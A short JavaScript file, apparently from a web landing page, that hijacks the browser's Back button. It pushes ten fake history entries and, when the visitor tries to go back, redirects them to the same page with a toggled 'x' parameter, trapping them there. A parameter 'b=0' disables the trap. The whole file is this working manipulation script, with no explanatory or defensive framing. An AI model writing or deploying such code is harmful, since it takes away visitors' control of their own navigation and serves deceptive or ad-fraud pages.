var PreventBb = false;
getUrlParameter("b") === "0" ? PreventBb = true : PreventBb = false;

var curX = getUrlParameter("x");
var nextX = null;
if (!curX || curX == "23") {
	nextX = "x=24";
} else if (curX && curX == "24") {
	nextX = "x=23";
}

!function () {
    if (!PreventBb) {
        var t;
        try {
            for (t = 0; 10 > t; ++t) history.pushState({}, "", "");
            onpopstate = function (t) {
                t.state && location.replace(getUrlWithParam(nextX))
            }
        } catch (o) {

        }
    }
}();

function getUrlParameter(name) {
	name = name.replace(/[\[]/, "\\[").replace(/[\]]/, "\\]");
	var regex = new RegExp("[\\?&]" + name + "=([^&#]*)"),
		results = regex.exec(location.search);
	return results === null ? "" : decodeURIComponent(results[1].replace(/\+/g, " "));
}

function getUrlWithParam(param) {
    var url = window.location.href;

    if (url.includes("x=")) {
        url = url.replace(/(x=)[0-9]{1,2}/, param)
    }
    else {
        url = url.includes("?") ? url + "&" + param : url + "?" + param;
    }

    return url;
}